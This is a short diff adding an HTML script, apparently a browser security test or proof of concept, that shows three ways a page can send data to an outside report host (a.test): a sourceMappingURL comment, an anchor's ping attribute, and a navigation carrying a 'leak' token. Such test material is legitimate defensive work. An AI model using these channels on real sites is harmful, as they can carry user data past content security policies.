@@ -1,0 +1,16 @@
+<script>
+// Step 1: sourceMapping POC
+var scriptTag = document.createElement('script');
+scriptTag.textContent = '//# sourceMappingURL=https://a.test/report/?leak=c661126'
+document.body.appendChild(scriptTag);
+
+// Step 2: <a ping>
+var a = document.createElement('a');
+a.href = '#';
+a.ping = 'https://a.test/report/?leak=c661126';
+document.body.appendChild(a);
+a.click();
+
+// Step 3: http 204 status
+location = 'https://a.test/report/?leak=c661126';
+</script>
